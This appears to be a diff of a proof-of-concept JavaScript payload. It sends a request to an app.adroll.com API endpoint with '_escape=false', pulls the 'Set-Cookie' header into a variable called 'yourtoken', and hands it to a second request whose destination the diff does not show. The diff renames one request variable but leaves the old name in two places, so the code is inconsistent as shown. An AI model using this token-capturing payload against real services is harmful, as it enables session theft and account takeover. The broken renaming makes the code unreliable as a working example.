@@ -1,9 +1,10 @@
     <script>
-    var xhr = new XMLHttpRequest();
+        
+    var xhr1 = new XMLHttpRequest();
 
-    xhr.onreadystatechange = function()
+    xhr1.onreadystatechange = function()
     {
-    if (xhr.readyState == 4 && xhr.status == 200)
+    if (xhr1.readyState == 4 && xhr.status == 200)
     {
     var yourtoken = xhr.getResponseHeader('Set-Cookie')
     var xhr2 = new XMLHttpRequest();
@@ -11,6 +12,8 @@
     xhr2.send();
     }
     }
-    xhr.open ("GET", "https://app.adroll.com/api/v1/account/get_minimum_budgets?_escape=false&frequency=daily");
-    xhr.send();
+
+    xhr1.open ("GET", "https://app.adroll.com/api/v1/account/get_minimum_budgets?_escape=false&frequency=daily");
+
+    xhr1.send();
     </script>
